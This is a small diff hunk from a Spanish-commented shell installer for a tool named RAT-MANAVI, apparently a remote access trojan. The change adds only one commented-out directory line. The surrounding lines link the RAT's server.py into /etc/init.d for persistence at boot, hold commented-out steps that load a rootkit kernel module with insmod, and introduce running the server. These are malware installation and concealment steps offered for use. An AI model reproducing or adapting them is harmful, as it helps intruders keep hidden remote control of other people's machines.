@@ -86,6 +86,7 @@ ln -s ${RAT_DIR}RAT-MANAVI/server.py /etc/init.d/
 
 #Intalar modulo de rootkit
 #cd ${RAT_DIR}RAT-MANAVI/rootkit/
+#cd ${RAT_DIR}RAT-MANAVI/
 #$INSMOD rootkit.ko
 
 #Ejecutar el server.py
